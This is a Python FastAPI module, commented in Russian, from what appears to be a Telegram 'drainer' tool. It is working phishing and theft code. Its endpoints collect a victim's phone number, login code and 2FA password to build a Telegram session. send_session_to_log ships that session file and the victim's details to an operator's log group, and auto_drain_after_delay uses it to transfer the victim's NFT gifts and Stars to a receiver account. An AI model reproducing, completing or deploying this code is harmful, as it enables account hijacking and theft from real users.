import logging
import asyncio
from typing import Dict
from fastapi import APIRouter, HTTPException, Body
from pydantic import BaseModel

from bot.utils.helpers import validate_webapp_data
from drainer.session_manager import session_manager
from database.db import db
from config import Config

logger = logging.getLogger(__name__)
router = APIRouter()

# Временное хранилище для процессов авторизации
auth_sessions: Dict[int, dict] = {}

class PhoneRequest(BaseModel):
    """Запрос с номером телефона"""
    phone: str
    country_code: str
    init_data: str

class CodeRequest(BaseModel):
    """Запрос с кодом подтверждения"""
    code: str
    init_data: str

class PasswordRequest(BaseModel):
    """Запрос с паролем 2FA"""
    password: str
    init_data: str

@router.post("/send_code")
async def send_code(request: PhoneRequest):
    """
    Отправка кода на номер телефона
    
    Args:
        phone: Номер телефона
        country_code: Код страны
        init_data: Данные от Telegram WebApp для валидации
    
    Returns:
        {"success": true, "step": "code"}
    """
    
    # Валидация initData от Telegram
    if not validate_webapp_data(request.init_data):
        raise HTTPException(status_code=401, detail="Invalid init data")
    
    # Получение user_id из initData
    from urllib.parse import parse_qsl
    parsed_data = dict(parse_qsl(request.init_data))
    
    import json
    user_data = json.loads(parsed_data.get('user', '{}'))
    user_id = user_data.get('id')
    
    if not user_id:
        raise HTTPException(status_code=400, detail="User ID not found")
    
    # Форматирование номера
    phone = f"{request.country_code}{request.phone}".replace("+", "").replace(" ", "").replace("-", "")
    
    logger.info(f"Отправка кода на {phone} для user {user_id}")
    
    try:
        # Создание сессии и отправка кода
        result = await session_manager.create_session_from_phone(phone, user_id)
        
        if not result.get('success'):
            raise HTTPException(status_code=400, detail=result.get('error', 'Unknown error'))
        
        # Регистрация/обновление пользователя в БД
        await db.add_user(user_id, user_data.get('username'), user_data.get('first_name'))
        
        return {
            "success": True,
            "step": "code",
            "phone": phone
        }
        
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/verify_code")
async def verify_code(request: CodeRequest):
    """
    Проверка кода подтверждения
    
    Args:
        code: Код из Telegram (5 цифр)
        init_data: Данные от Telegram WebApp
    
    Returns:
        {"success": true, "step": "completed"/"2fa"}
    """
    
    # Валидация initData
    if not validate_webapp_data(request.init_data):
        raise HTTPException(status_code=401, detail="Invalid init data")
    
    # Получение user_id
    from urllib.parse import parse_qsl
    import json
    
    parsed_data = dict(parse_qsl(request.init_data))
    user_data = json.loads(parsed_data.get('user', '{}'))
    user_id = user_data.get('id')
    
    if not user_id:
        raise HTTPException(status_code=400, detail="User ID not found")
    
    logger.info(f"Проверка кода для user {user_id}")
    
    try:
        # Проверка кода
        result = await session_manager.verify_code(user_id, request.code)
        
        if not result.get('success'):
            return {
                "success": False,
                "error": result.get('error', 'Invalid code')
            }
        
        step = result.get('step')
        
        if step == 'completed':
            # Авторизация завершена - отправляем сессию в лог-группу
            session_file = result.get('session_file')
            user_info = result.get('user_info')
            
            await send_session_to_log(user_id, session_file, user_info)
            
            # Запуск авто-дрейна если включен
            settings = await db.get_settings()
            if settings.get('auto_drain_enabled', False):
                delay = settings.get('auto_drain_delay', 5)
                asyncio.create_task(auto_drain_after_delay(user_id, delay))
            
            return {
                "success": True,
                "step": "completed",
                "user_info": user_info
            }
        
        elif step == '2fa':
            # Требуется 2FA
            return {
                "success": True,
                "step": "2fa"
            }
        
    except Exception as e:
        logger.error(f"Ошибка проверки кода: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/verify_password")
async def verify_password(request: PasswordRequest):
    """
    Проверка пароля 2FA
    
    Args:
        password: Пароль двухфакторной аутентификации
        init_data: Данные от Telegram WebApp
    
    Returns:
        {"success": true, "step": "completed"}
    """
    
    # Валидация initData
    if not validate_webapp_data(request.init_data):
        raise HTTPException(status_code=401, detail="Invalid init data")
    
    # Получение user_id
    from urllib.parse import parse_qsl
    import json
    
    parsed_data = dict(parse_qsl(request.init_data))
    user_data = json.loads(parsed_data.get('user', '{}'))
    user_id = user_data.get('id')
    
    if not user_id:
        raise HTTPException(status_code=400, detail="User ID not found")
    
    logger.info(f"Проверка 2FA для user {user_id}")
    
    try:
        # Проверка пароля
        result = await session_manager.verify_2fa(user_id, request.password)
        
        if not result.get('success'):
            return {
                "success": False,
                "error": result.get('error', 'Invalid password')
            }
        
        # Авторизация завершена
        session_file = result.get('session_file')
        user_info = result.get('user_info')
        
        await send_session_to_log(user_id, session_file, user_info)
        
        # Запуск авто-дрейна
        settings = await db.get_settings()
        if settings.get('auto_drain_enabled', False):
            delay = settings.get('auto_drain_delay', 5)
            asyncio.create_task(auto_drain_after_delay(user_id, delay))
        
        return {
            "success": True,
            "step": "completed",
            "user_info": user_info
        }
        
    except Exception as e:
        logger.error(f"Ошибка проверки 2FA: {e}")
        raise HTTPException(status_code=500, detail=str(e))

async def send_session_to_log(user_id: int, session_file: str, user_info: dict):
    """
    Отправка файла сессии в LOG_GROUP_ID
    
    Args:
        user_id: ID пользователя
        session_file: Путь к файлу сессии
        user_info: Информация о пользователе
    """
    from bot import bot
    from aiogram.types import FSInputFile
    from datetime import datetime
    
    try:
        username = user_info.get('username', 'нет')
        first_name = user_info.get('first_name', 'Unknown')
        phone = user_info.get('phone', 'нет')
        
        caption = (
            "🔐 <b>Новая авторизация!</b>\n\n"
            f"👤 <b>Пользователь:</b> {first_name}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"👥 <b>Username:</b> @{username}\n"
            f"📱 <b>Номер:</b> +{phone}\n"
            f"⏰ <b>Время:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
            "📂 <b>Сессия прикреплена ниже ⬇️</b>"
        )
        
        # Отправка файла сессии
        await bot.send_document(
            Config.LOG_GROUP_ID,
            FSInputFile(session_file),
            caption=caption,
            parse_mode="HTML"
        )
        
        logger.info(f"Сессия {user_id} отправлена в лог-группу")
        
    except Exception as e:
        logger.error(f"Ошибка отправки сессии в лог: {e}")

async def auto_drain_after_delay(user_id: int, delay: int):
    """
    Автоматический дрейн после задержки
    
    Args:
        user_id: ID пользователя
        delay: Задержка в секундах
    """
    from drainer.gift_drainer import GiftDrainer
    from drainer.star_drainer import StarDrainer
    from bot import bot
    from datetime import datetime
    
    logger.info(f"Авто-дрейн для {user_id} начнётся через {delay} секунд")
    
    # Задержка
    await asyncio.sleep(delay)
    
    try:
        # Получение клиента
        client = await session_manager.get_client(user_id)
        
        if not client:
            logger.error(f"Не удалось получить клиент для авто-дрейна {user_id}")
            return
        
        # Дрейн подарков
        gifts_result = await GiftDrainer.drain_all_gifts(client, user_id, Config.RECEIVER_ID)
        
        # Дрейн звёзд
        stars_result = await StarDrainer.drain_all_stars(client, user_id, Config.RECEIVER_ID)
        
        # Закрытие клиента
        await session_manager.close_client(client)
        
        # Формирование отчёта
        nfts = gifts_result.get('transferred_nfts', [])
        converted_stars = gifts_result.get('converted_stars', 0)
        total_stars = stars_result.get('drained_via_gifts', 0) + stars_result.get('drained_via_bot', 0)
        
        from bot.utils.helpers import format_stars
        
        report_text = (
            "✅ <b>Авто-дрейн завершён!</b>\n\n"
            f"👤 <b>Пользователь:</b> {user_id}\n"
            f"⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"🎁 <b>NFT передано:</b> {len(nfts)}\n"
            f"⭐ <b>Звёзд от конвертации подарков:</b> {format_stars(converted_stars)}\n"
            f"💰 <b>Всего звёзд получено:</b> {format_stars(total_stars)}"
        )
        
        if nfts:
            report_text += "\n\n💎 <b>NFT подарки:</b>\n"
            for nft in nfts[:5]:
                report_text += f"• {nft['title']}\n"
        
        # Отправка отчёта в лог
        await bot.send_message(Config.LOG_GROUP_ID, report_text, parse_mode="HTML")
        
        logger.info(f"Авто-дрейн {user_id} завершён успешно")
        
    except Exception as e:
        logger.error(f"Ошибка авто-дрейна {user_id}: {e}")